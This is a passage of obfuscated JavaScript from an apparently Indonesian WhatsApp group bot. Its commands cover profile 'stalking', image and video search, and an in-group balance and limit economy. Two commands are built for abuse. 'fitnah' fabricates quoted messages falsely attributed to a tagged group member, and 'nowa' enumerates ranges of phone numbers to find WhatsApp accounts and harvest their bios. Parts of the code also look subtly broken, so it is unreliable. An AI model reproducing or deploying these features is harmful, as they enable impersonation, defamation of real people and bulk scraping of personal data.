            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + 'limit untuk mengecek limit');
            if (!q) return _0x358f3b('Example: ' + (_0x3b7c58 + _0x453fc1) + ' id');
            _0x358f3b(mess[_0x5804c8(0x135)]), eeh = await ffstalk['ffstalk']('' + q), _0x358f3b(_0x5804c8(0xb65) + eeh['id'] + '\x0aNickname : ' + eeh[_0x5804c8(0x2b0)]);
        }
        break;
        case 'mlstalk': {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + 'limit untuk mengecek limit');
            if (!q) return _0x358f3b('Example: ' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xca2));
            _0x358f3b(mess[_0x5804c8(0x135)]);
            let _0x2b8713 = await mlstalk[_0x5804c8(0x230)](q[_0x5804c8(0x4bd)]('|')[0x0], q[_0x5804c8(0x4bd)]('|')[0x1]);
            _0x358f3b('Username : ' + _0x2b8713[_0x5804c8(0xaba)] + _0x5804c8(0x3f1) + q[_0x5804c8(0x4bd)]('|')[0x0] + _0x5804c8(0xc8a) + q['split']('|')[0x1]);
        }
        break;
        case 'igstalk': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!q) return _0x358f3b(_0x5804c8(0xd9a) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x1d0));
            _0x358f3b(mess['wait']);
            let _0x443e04 = await fetchJson('https://skizo.tech/api/igstalk?user=' + q + '&apikey=' + _0x932571[_0x5804c8(0x342)]);
            const _0x4b3a31 = _0x443e04['username'],
                _0x393a6e = _0x443e04['fullname'],
                _0x40408f = _0x443e04[_0x5804c8(0x7f8)],
                _0x296a02 = _0x443e04[_0x5804c8(0xa3a)],
                _0x2ec11d = _0x443e04[_0x5804c8(0x1fb)],
                _0x1c4b1b = _0x443e04[_0x5804c8(0x315)];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'image': {
                    'url': _0x443e04[_0x5804c8(0x532)]
                },
                'caption': _0x5804c8(0x380) + _0x4b3a31 + _0x5804c8(0x502) + _0x393a6e + _0x5804c8(0x922) + _0x40408f + _0x5804c8(0xc76) + _0x296a02 + _0x5804c8(0x5a6) + _0x2ec11d + _0x5804c8(0x9f4) + _0x1c4b1b
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case 'pinterest':
        case _0x5804c8(0x672): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!_0x1b04cf) return _0x358f3b('Gunakan dengan cara ' + (_0x3b7c58 + _0x453fc1) + ' *text*\x0a\x0a_Contoh_\x0a\x0a' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x482));
            _0x358f3b(_0x5804c8(0xb04));
            let _0x3107bc = await pinterest(_0x1b04cf),
                _0x5731c9 = _0x3107bc[Math[_0x5804c8(0xa2b)](Math['random']() * _0x3107bc[_0x5804c8(0x977)])];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x5731c9
                },
                'caption': _0x5804c8(0x3b7)
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case _0x5804c8(0x693):
        case _0x5804c8(0x51c): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!_0x1b04cf) _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x5d6) + (_0x3b7c58 + _0x453fc1) + ' Cara membuat bot WhatsApp');
            let _0x329fb7 = await yts('' + _0x1b04cf),
                _0x3ea108 = _0x329fb7[_0x5804c8(0xc4d)];
            var _0x52c915 = await getBuffer(_0x3ea108[0x0][_0x5804c8(0x63e)]);
            let _0x4ca8ec = _0x3ea108[_0x5804c8(0x686)](_0x433a2b => {
                const _0x4f4ae2 = _0x5804c8;
                switch (_0x433a2b[_0x4f4ae2(0xd44)]) {
                case _0x4f4ae2(0x7f5):
                    return (_0x4f4ae2(0xb71) + _0x433a2b[_0x4f4ae2(0x196)] + _0x4f4ae2(0x421) + _0x433a2b[_0x4f4ae2(0x376)] + _0x4f4ae2(0x867) + _0x433a2b[_0x4f4ae2(0x2c4)] + _0x4f4ae2(0x89e) + _0x433a2b['views'] + '\x0a🌀 Url : ' + _0x433a2b[_0x4f4ae2(0xbf3)] + '\x0a')[_0x4f4ae2(0xd5d)]();
                case 'channel':
                    return ('\x0a📛 Channel : *' + _0x433a2b[_0x4f4ae2(0x35b)] + _0x4f4ae2(0xb2a) + _0x433a2b[_0x4f4ae2(0xbf3)] + '\x0a👻 Subscriber : ' + _0x433a2b['subCountLabel'] + ' (' + _0x433a2b['subCount'] + _0x4f4ae2(0x21f) + _0x433a2b[_0x4f4ae2(0x6a9)] + '\x0a')[_0x4f4ae2(0xd5d)]();
                }
            })[_0x5804c8(0xd6e)](_0x4dae14 => _0x4dae14)['join'](_0x5804c8(0x207));
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': _0x52c915,
                'caption': _0x4ca8ec
            }, {
                'quoted': _0x1b1e88
            })['catch'](_0x435b0e => {
                _0x358f3b('Not found');
            });
        }
        break;
        case _0x5804c8(0xa26): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + _0x5804c8(0xbc1));
            _0x358f3b(mess['wait']), _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'caption': 'Jangan Lupa Post Sw Biar Mantan Panas Coy🥵',
                'image': {
                    'url': _0x5804c8(0xc31) + _0x932571['ZenzKey']
                }
            }, {
                'quoted': _0x1b1e88
            })[_0x5804c8(0xb9d)](_0x5035e4 => {
                const _0x5729f4 = _0x5804c8;
                _0x358f3b(mess['error'][_0x5729f4(0x344)]);
            }), limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        }
        break;
        case _0x5804c8(0xaa8): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x7b6ab6 && !_0x75f0ff) return _0x358f3b(mess['OnlyPrem']);
            _0x358f3b(mess[_0x5804c8(0x135)]), _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'caption': 'Wangyy Wangyy😋',
                'image': {
                    'url': _0x5804c8(0x429) + _0x932571['ZenzKey']
                }
            }, {
                'quoted': _0x1b1e88
            })[_0x5804c8(0xb9d)](_0x565bc9 => {
                const _0x5ce6f4 = _0x5804c8;
                _0x358f3b(mess[_0x5ce6f4(0x5d2)][_0x5ce6f4(0x344)]);
            }), limitAdd(_0x1b1e88['sender'], limit);
        }
        break;
        case _0x5804c8(0x5a5): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + 'limit untuk mengecek limit');
            _0x358f3b(mess[_0x5804c8(0x135)]), _0x1c7aed(_0x5804c8(0x33b), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
            var _0x22b616 = ['cowo korea', 'cowo china', _0x5804c8(0x202)];
            let _0x4802f1 = await pinterest(_0x22b616[Math['floor'](Math[_0x5804c8(0xbbf)]() * _0x22b616[_0x5804c8(0x977)])]),
                _0x1267b3 = _0x4802f1[Math['floor'](Math[_0x5804c8(0xbbf)]() * _0x4802f1[_0x5804c8(0x977)])];
            _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                'caption': _0x5804c8(0x1f6),
                'image': {
                    'url': _0x1267b3
                }
            }, {
                'quoted': _0x1b1e88
            })[_0x5804c8(0xb9d)](_0x245a4e => {
                const _0x15aa85 = _0x5804c8;
                _0x358f3b(mess[_0x15aa85(0x5d2)][_0x15aa85(0x344)]);
            }), limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        }
        break;
        case _0x5804c8(0xb54): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            _0x358f3b(mess[_0x5804c8(0x135)]), _0x1c7aed(_0x5804c8(0x3a3), _0x1b1e88['sender'], _cmd);
            var _0x31a247 = (await axios[_0x5804c8(0xb9b)](_0x5804c8(0xd8a)))[_0x5804c8(0x233)]['url'];
            _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                'caption': _0x5804c8(0xa2d),
                'image': {
                    'url': _0x31a247
                }
            }, {
                'quoted': _0x1b1e88
            })[_0x5804c8(0xb9d)](_0xef1c3c => {
                const _0xe8e15a = _0x5804c8;
                console[_0xe8e15a(0xcd3)](color(_0xe8e15a(0xd58), _0xe8e15a(0xb3d)), _0xef1c3c), _0x358f3b(mess[_0xe8e15a(0x5d2)][_0xe8e15a(0x344)]);
            }), limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        }
        break;
        case _0x5804c8(0x866): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88['isGroup']) return _0x358f3b(mess[_0x5804c8(0xb42)]);
            balance[_0x5804c8(0x743)]((_0x2f9ad7, _0x5e750c) => _0x2f9ad7[_0x5804c8(0xa52)] < _0x5e750c[_0x5804c8(0xa52)] ? 0x1 : -0x1);
            let _0x152630 = _0x5804c8(0x1af),
                _0x5dfc0d = [];
            var _0x523589 = 0xa;
            if (balance[_0x5804c8(0x977)] < 0xa) _0x523589 = balance[_0x5804c8(0x977)];
            for (let _0x2c65be = 0x0; _0x2c65be < _0x523589; _0x2c65be++) {
                _0x152630 += _0x2c65be + 0x1 + _0x5804c8(0x36d) + balance[_0x2c65be]['id'][_0x5804c8(0x4bd)]('@')[0x0] + _0x5804c8(0x4b6) + balance[_0x2c65be][_0x5804c8(0xa52)] + '\x0a\x0a', _0x5dfc0d[_0x5804c8(0x453)](balance[_0x2c65be]['id']);
            }
            _0x614da8[_0x5804c8(0x2a4)](_0x1b1e88[_0x5804c8(0x60f)], _0x152630, _0x1b1e88);
        }
        break;
        case 'toplocal': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88['isGroup']) return _0x358f3b(mess['OnlyGrup']);
            balance[_0x5804c8(0x743)]((_0x3ef082, _0x286c0b) => _0x3ef082[_0x5804c8(0xa52)] < _0x286c0b[_0x5804c8(0xa52)] ? 0x1 : -0x1);
            let _0x31af51 = '*── 「 TOPLOCAL BALANCE 」 ──*\x0a\x0a',
                _0x1bac12 = [];
            var _0x523589 = 0xa;
            if (balance['length'] < 0xa) _0x523589 = balance['length'];
            let _0x345592 = _0x3734ec[_0x5804c8(0x686)](_0x56c943 => _0x56c943['id']);
            for (let _0x59dba9 = 0x0; _0x59dba9 < _0x523589; _0x59dba9++) {
                _0x345592[_0x5804c8(0x34b)](balance[_0x59dba9]['id']) && (_0x31af51 += _0x59dba9 + 0x1 + _0x5804c8(0x36d) + balance[_0x59dba9]['id'][_0x5804c8(0x4bd)]('@')[0x0] + _0x5804c8(0x4b6) + balance[_0x59dba9]['balance'] + '\x0a\x0a', _0x1bac12[_0x5804c8(0x453)](balance[_0x59dba9]['id']));
            }
            _0x614da8['sendTextWithMentions'](_0x1b1e88[_0x5804c8(0x60f)], _0x31af51, _0x1b1e88);
        }
        break;
        case _0x5804c8(0x8a2): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x5c3));
            if (_0x1b04cf[_0x5804c8(0x34b)]('-')) return _0x358f3b(_0x5804c8(0x910));
            if (isNaN(_0x1b04cf)) return _0x358f3b(_0x5804c8(0x5b2));
            if (_0x83eae5[0x0] === _0x5804c8(0x59b)) return _0x358f3b(_0x5804c8(0x1ed));
            let _0x4cb81d = Number(parseInt(_0x1b04cf) * 0x32);
            if (getBalance(_0x1b1e88[_0x5804c8(0xd13)], balance) < _0x4cb81d) return _0x358f3b('Balance kamu tidak mencukupi untuk pembelian ini');
            _0x1c7aed(_0x5804c8(0xcef), _0x1b1e88[_0x5804c8(0xd13)], _cmd), kurangBalance(_0x1b1e88[_0x5804c8(0xd13)], _0x4cb81d, balance), giveLimit(_0x1b1e88[_0x5804c8(0xd13)], parseInt(_0x1b04cf), limit), _0x358f3b(_0x5804c8(0xbe6) + _0x1b04cf + _0x5804c8(0x898) + getBalance(_0x1b1e88[_0x5804c8(0xd13)], balance) + _0x5804c8(0xa93) + getLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x49d6b7, limit) + '/' + _0x49d6b7);
        }
        break;
        case _0x5804c8(0xa43):
        case _0x5804c8(0x3a9): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b04cf) return _0x358f3b('Gunakan dengan cara ' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x930));
            if (_0x1b04cf['includes']('-')) return _0x358f3b('Jangan menggunakan -');
            if (isNaN(_0x1b04cf)) return _0x358f3b(_0x5804c8(0x5b2));
            if (_0x1b04cf === _0x5804c8(0x59b)) return _0x358f3b(_0x5804c8(0x1ed));
            let _0x2d6383 = Number(parseInt(_0x1b04cf) * 0x32);
            if (getBalance(_0x1b1e88['sender'], balance) < _0x2d6383) return _0x358f3b('Balance kamu tidak mencukupi untuk pembelian ini');
            _0x1c7aed('#buygamelimit', _0x1b1e88['sender'], _cmd), kurangBalance(_0x1b1e88['sender'], _0x2d6383, balance), givegame(_0x1b1e88[_0x5804c8(0xd13)], parseInt(_0x1b04cf), glimit), _0x358f3b(_0x5804c8(0x8b8) + _0x1b04cf + _0x5804c8(0x898) + getBalance(_0x1b1e88[_0x5804c8(0xd13)], balance) + _0x5804c8(0x81f) + cekGLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x1efa36, glimit) + '/' + _0x1efa36);
        }
        break;
        case _0x5804c8(0x39c):
        case 'tf': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x68b) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x36b));
            let _0x3f2ffa = _0x1b1e88['mentionedJid'][0x0] ? _0x1b1e88[_0x5804c8(0x583)][0x0] : _0x1b1e88[_0x5804c8(0x6a4)] ? _0x1b1e88[_0x5804c8(0x6a4)][_0x5804c8(0xd13)] : _0x1b04cf[_0x5804c8(0xa72)](/[^0-9]/g, '') + _0x5804c8(0x7cd);
            if (!_0x3f2ffa) return _0x358f3b('Tag orang yang ingin di transfer balance');
            if (!_0x83eae5[0x1]) return _0x358f3b(_0x5804c8(0x63d));
            if (isNaN(_0x83eae5[0x1])) return _0x358f3b(_0x5804c8(0x58f));
            if (_0x83eae5[0x1] === 'infinity') return _0x358f3b('Yahaha saya ndak bisa di tipu');
            if (_0x83eae5[0x1]['includes']('-')) return _0x358f3b(_0x5804c8(0x910));
            var _0x2e288c = getBalance(_0x1b1e88[_0x5804c8(0xd13)], balance);
            if (_0x2e288c < _0x83eae5[0x1] || _0x2e288c == _0x5804c8(0x4fb)) return _0x358f3b(_0x5804c8(0xa92) + _0x83eae5[0x1] + _0x5804c8(0xae7) + _0x3b7c58 + _0x5804c8(0x27e));
            _0x1c7aed(_0x5804c8(0xb88), _0x1b1e88[_0x5804c8(0xd13)], _cmd), kurangBalance(_0x1b1e88['sender'], parseInt(_0x1b04cf), balance), addBalance(_0x3f2ffa, parseInt(_0x83eae5[0x1]), balance), _0x614da8[_0x5804c8(0x2a4)](_0x1b1e88[_0x5804c8(0x60f)], _0x5804c8(0xb29) + _0x83eae5[0x1] + _0x5804c8(0xb2f) + _0x3f2ffa[_0x5804c8(0x4bd)]('@')[0x0], _0x1b1e88);
        }
        break;
        case _0x5804c8(0x544):
        case _0x5804c8(0xa52):
        case _0x5804c8(0x2c7):
        case _0x5804c8(0x9c8): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            var _0x19e712 = await getBalance(_0x1b1e88['sender'], balance),
                _0x4c1792 = getLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x49d6b7, limit) + '/' + _0x49d6b7;
            _0x358f3b(_0x5804c8(0x8c9) + (_0x75f0ff ? _0x5804c8(0x770) : _0x4c1792) + _0x5804c8(0x4df) + cekGLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x1efa36, glimit) + '/' + _0x1efa36 + '\x0a🏦 Balance : $' + _0x19e712 + _0x5804c8(0xd5b) + _0x3b7c58 + _0x5804c8(0x3cf) + _0x3b7c58 + _0x5804c8(0xa54) + _0x3b7c58 + _0x5804c8(0x95b) + _0x3b7c58 + _0x5804c8(0xb3c));
            break;
        }
        case _0x5804c8(0x3ba):
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b('Fitur Khusus Group!');
            if (!_0x1b04cf) return _0x614da8[_0x5804c8(0x2a4)](_0x1b1e88[_0x5804c8(0x60f)], _0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + ' *@tag|pesantarget|pesanbot*\x0a\x0a_Contoh_\x0a\x0a' + (_0x3b7c58 + _0x453fc1) + ' @' + _0x1b1e88['sender'][_0x5804c8(0x4bd)]('@')[0x0] + _0x5804c8(0x3e7), _0x1b1e88);
            var _0x4983ed = _0x1b04cf[_0x5804c8(0x4bd)]('|')[0x0],
                _0x37758b = _0x1b04cf['split']('|')[0x1],
                _0x4d2521 = _0x1b04cf[_0x5804c8(0x4bd)]('|')[0x2];
            if (!_0x4983ed[_0x5804c8(0xac2)]('@')) return _0x358f3b(_0x5804c8(0xd73));
            if (!_0x37758b) return _0x358f3b('Masukkan pesan target!');
            if (!_0x4d2521) return _0x358f3b(_0x5804c8(0xb6d));
            var _0x554fa5 = parseMention(_0x37758b);
            _0x1c7aed('#fitnah', _0x1b1e88[_0x5804c8(0xd13)], _cmd);
            var _0x811947 = {
                    'key': {
                        'fromMe': ![],
                        'participant': '' + parseMention(_0x4983ed),
                        'remoteJid': _0x1b1e88[_0x5804c8(0x60f)] ? _0x1b1e88[_0x5804c8(0x60f)] : ''
                    },
                    'message': {
                        'extemdedTextMessage': {
                            'text': '' + _0x37758b,
                            'contextInfo': {
                                'mentionedJid': _0x554fa5
                            }
                        }
                    }
                },
                _0x181cae = {
                    'key': {
                        'fromMe': ![],
                        'participant': '' + parseMention(_0x4983ed),
                        'remoteJid': _0x1b1e88[_0x5804c8(0x60f)] ? _0x1b1e88[_0x5804c8(0x60f)] : ''
                    },
                    'message': {
                        'conversation': '' + _0x37758b
                    }
                };
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'text': _0x4d2521,
                'mentions': _0x554fa5
            }, {
                'quoted': _0x554fa5[_0x5804c8(0x977)] > 0x2 ? _0x811947 : _0x181cae
            });
            break;
        case 'nowa':
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (!_0x75f0ff) return _0x358f3b(mess[_0x5804c8(0x8f0)]);
            if (!_0x1b04cf) return _0x358f3b('Gunakan dengan cara ' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xa9c) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xb38));
            if (!_0x1b04cf[_0x5804c8(0x34b)]('x')) return _0x358f3b(_0x5804c8(0xb10));
            _0x358f3b(mess[_0x5804c8(0x135)]), _0x1c7aed('#nowa', _0x1b1e88['sender'], _cmd);

            function _0x3c935b(_0x342c12, _0x5a1767) {
                const _0x5556c5 = _0x5804c8;
                return _0x342c12['split'](_0x5a1767)[_0x5556c5(0x977)] - 0x1;
            }
            var _0x4c18c8 = _0x39c4be[_0x5804c8(0x4bd)]('x')[0x0],
                _0x39089c = _0x39c4be['split']('x')[_0x3c935b(_0x39c4be, 'x')] ? _0x39c4be['split']('x')[_0x3c935b(_0x39c4be, 'x')] : '',
                _0x40f454 = _0x3c935b(_0x39c4be, 'x'),
                _0x1b1281;
            if (_0x40f454 == 0x1) _0x1b1281 = 0xa;
            else {
                if (_0x40f454 == 0x2) _0x1b1281 = 0x64;
                else _0x40f454 == 0x3 && (_0x1b1281 = 0x3e8);
            }
            var _0x144f65 = 'List Nomer\x0a\x0aPunya Bio/status/info\x0a',
                _0x459680 = _0x5804c8(0x325),
                _0x9b377f = _0x5804c8(0x741);
            for (let _0x2849a6 = 0x0; _0x2849a6 < _0x1b1281; _0x2849a6++) {
                var _0x22a8d6 = ['1', '2', '3', '4', '5', '6', '7', '8', '9'],
                    _0x1e135d = _0x22a8d6[Math['floor'](Math['random']() * _0x22a8d6[_0x5804c8(0x977)])],
                    _0x2e9466 = _0x22a8d6[Math[_0x5804c8(0xa2b)](Math['random']() * _0x22a8d6[_0x5804c8(0x977)])],
                    _0x3b814b = _0x22a8d6[Math['floor'](Math[_0x5804c8(0xbbf)]() * _0x22a8d6[_0x5804c8(0x977)])],
                    _0x236851 = _0x22a8d6[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x22a8d6[_0x5804c8(0x977)])],
                    _0x6e7bbc;
                if (_0x40f454 == 0x1) _0x6e7bbc = '' + _0x1e135d;
                else {
                    if (_0x40f454 == 0x2) _0x6e7bbc = '' + _0x1e135d + _0x2e9466;
                    else {
                        if (_0x40f454 == 0x3) _0x6e7bbc = '' + _0x1e135d + _0x2e9466 + _0x3b814b;
                        else _0x40f454 == 0x4 && (_0x6e7bbc = '' + _0x1e135d + _0x2e9466 + _0x3b814b + _0x236851);
                    }
                }
                var _0x2e288c = await _0x614da8[_0x5804c8(0x9a9)]('' + _0x4c18c8 + _0x2849a6 + _0x39089c + '@s.whatsapp.net'),
                    _0x5f0a43 = _0x2e288c[_0x5804c8(0x977)] !== 0x0 ? _0x2e288c : ![];
                try {
                    try {
                        var _0x4d8e3c = await _0x614da8[_0x5804c8(0x67a)](_0x2e288c[0x0][_0x5804c8(0x194)]);
                    } catch {
                        var _0x4d8e3c = _0x5804c8(0x5fe);
                    }
                    if (_0x4d8e3c == '401' || _0x4d8e3c['status'][_0x5804c8(0x977)] == 0x0) _0x459680 += _0x5804c8(0x85b) + _0x2e288c[0x0][_0x5804c8(0x194)][_0x5804c8(0x4bd)]('@')[0x0] + '\x0a', console[_0x5804c8(0xcd3)]('-' + _0x2849a6 + ') ' + _0x4c18c8 + _0x2849a6 + _0x39089c, color(_0x5804c8(0xbcd), 'green'));
                    else {
                        if (_0x40f454 == 0x6) {
                            var _0x59d6af = '' + moment(_0x4d8e3c[_0x5804c8(0x791)])['tz'](_0x5804c8(0x8cb))[_0x5804c8(0xb27)](_0x5804c8(0x934));
                            _0x59d6af[_0x5804c8(0x470)](_0x5804c8(0x5d3)) && (_0x144f65 += 'wa.me/' + _0x2e288c[0x0][_0x5804c8(0x194)][_0x5804c8(0x4bd)]('@')[0x0] + _0x5804c8(0x1cc) + _0x4d8e3c[_0x5804c8(0x670)] + _0x5804c8(0x2a1) + moment(_0x4d8e3c[_0x5804c8(0x791)])['tz'](_0x5804c8(0x8cb))[_0x5804c8(0xb27)](_0x5804c8(0x934)) + '\x0a\x0a', console[_0x5804c8(0xcd3)]('-' + _0x2849a6 + ') ' + _0x4c18c8 + _0x2849a6 + _0x39089c, color(' [REGISTERED]', 'green')));
                        } else _0x144f65 += 'wa.me/' + _0x2e288c[0x0][_0x5804c8(0x194)][_0x5804c8(0x4bd)]('@')[0x0] + '\x0aBio Name : ' + _0x4d8e3c['status'] + _0x5804c8(0x2a1) + moment(_0x4d8e3c[_0x5804c8(0x791)])['tz'](_0x5804c8(0x8cb))[_0x5804c8(0xb27)](_0x5804c8(0x934)) + '\x0a\x0a', console[_0x5804c8(0xcd3)]('-' + _0x2849a6 + ') ' + _0x4c18c8 + _0x2849a6 + _0x39089c, color(' [REGISTERED]', _0x5804c8(0x87a)));
                    }
                } catch {
                    _0x9b377f += '' + _0x4c18c8 + _0x2849a6 + _0x39089c + '\x0a', console[_0x5804c8(0xcd3)]('-' + _0x2849a6 + ') ' + _0x4c18c8 + _0x2849a6 + _0x39089c, color(' [NOT REGISTERED]', _0x5804c8(0xb3d)));
                }
            }
            _0x358f3b('' + _0x144f65 + _0x459680 + _0x9b377f);
            break;
        case 'q':
        case _0x5804c8(0x6a4): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0x6a4)]) return _0x358f3b(_0x5804c8(0x416));
            let _0x325ad2 = await _0x614da8[_0x5804c8(0xc58)](await _0x1b1e88[_0x5804c8(0xb61)]());
            if (!_0x325ad2[_0x5804c8(0x6a4)]) return _0x358f3b(_0x5804c8(0xd4a));
            await _0x325ad2['quoted'][_0x5804c8(0x15a)](_0x1b1e88[_0x5804c8(0x60f)], !![]);
        }
        break;
        case _0x5804c8(0x949):
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x75f0ff) return rely(mess[_0x5804c8(0x8f0)]);
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(mess['OnlyGrup']);
            if (!_0x1b04cf) return _0x614da8['sendTextWithMentions'](_0x1b1e88[_0x5804c8(0x60f)], _0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + ' *@tag|text*\x0a\x0a_Contoh_\x0a\x0a' + (_0x3b7c58 + _0x453fc1) + ' @' + _0x1b1e88[_0x5804c8(0xd13)][_0x5804c8(0x4bd)]('@')[0x0] + _0x5804c8(0x940), _0x1b1e88);
            var _0x4983ed = _0x1b04cf[_0x5804c8(0x4bd)]('|')[0x0],
                _0x39c4be = _0x1b04cf[_0x5804c8(0x4bd)]('|')[0x1];
            if (!_0x4983ed[_0x5804c8(0xac2)]('@')) return _0x358f3b(_0x5804c8(0xd73));
            var _0x54db11 = [];
            _0x3734ec[_0x5804c8(0x686)](_0x134a6d => _0x54db11[_0x5804c8(0x453)](_0x134a6d['id']));
            var _0x554fa5 = parseMention(_0x37758b);
            _0x1c7aed(_0x5804c8(0xb6e), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
            var _0x811947 = {
                    'key': {
                        'fromMe': ![],
                        'participant': '' + parseMention(_0x4983ed),
                        'remoteJid': _0x1b1e88['chat'] ? _0x1b1e88[_0x5804c8(0x60f)] : ''
                    },
                    'message': {
                        'extemdedTextMessage': {
                            'text': _0x3b7c58 + _0x5804c8(0x57d) + _0x39c4be,
                            'contextInfo': {
                                'mentionedJid': _0x554fa5
                            }
                        }
                    }
                },
                _0x181cae = {
                    'key': {
                        'fromMe': ![],
                        'participant': '' + parseMention(_0x4983ed),
                        'remoteJid': _0x1b1e88['chat'] ? _0x1b1e88['chat'] : ''
                    },
                    'message': {
                        'conversation': _0x3b7c58 + _0x5804c8(0x57d) + _0x39c4be
                    }
                };
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'text': _0x39c4be ? _0x39c4be : '',
                'mentions': _0x54db11
            }, {
                'quoted': _0x554fa5['length'] > 0x2 ? _0x811947 : _0x181cae
            });
            break;
        case _0x5804c8(0x952):
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x75f0ff) return rely(mess[_0x5804c8(0x8f0)]);
            if (!_0x1b1e88['quoted']) return _0x358f3b(_0x5804c8(0x84c));
            if (!_0x1b04cf) return _0x358f3b('Masukkan 1 emoji');
            if (!_0x434b38(_0x1b04cf)) return _0x358f3b('Itu bukan emoji!');
            if (_0x434b38(_0x1b04cf)[_0x5804c8(0x977)] > 0x1) return _0x358f3b(_0x5804c8(0x668));
            _0x1c7aed('#react', _0x1b1e88[_0x5804c8(0xd13)], _cmd);
            var _0x5766f5 = {
                'reactionMessage': {
                    'key': {
                        'remoteJid': _0x1b1e88[_0x5804c8(0x60f)],
                        'fromMe': _0x1b1e88[_0x5804c8(0x2a9)][_0x5804c8(0xcbd)],
                        'id': _0x8a4e1a['id']
                    },
                    'text': _0x1b04cf
                }
            };
            _0x614da8[_0x5804c8(0x29a)](_0x1b1e88[_0x5804c8(0x60f)], _0x5766f5);
            break;
        case _0x5804c8(0x446):
        case 'addcmd': {
